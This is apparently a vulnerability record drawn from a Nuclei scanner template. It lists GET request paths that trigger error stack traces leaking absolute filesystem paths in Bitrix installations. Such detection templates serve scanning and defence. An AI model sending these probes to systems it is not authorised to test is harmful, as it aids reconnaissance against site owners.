# Vulnerability: Bitrix Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`bitrix-fpd.yaml`)

## Description
Detected Full Path Disclosure (FPD) in Bitrix by sending requests request to specific paths and identifying fatal error stack traces that leaked absolute filesystem paths.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/?USER_FIELD_MANAGER=1
GET {{BaseURL}}/bitrix/admin/restore_export.php
GET {{BaseURL}}/bitrix/admin/tools_index.php
GET {{BaseURL}}/bitrix/bitrix.php
GET {{BaseURL}}/bitrix/modules/main/ajax_tools.php
GET {{BaseURL}}/bitrix/php_interface/after_connect_d7.php
GET {{BaseURL}}/bitrix/themes/.default/.description.php
GET {{BaseURL}}/bitrix/components/bitrix/main.ui.selector/templates/.default/template.php
GET {{BaseURL}}/bitrix/components/bitrix/forum.user.profile.edit/templates/.default/interface.php
```

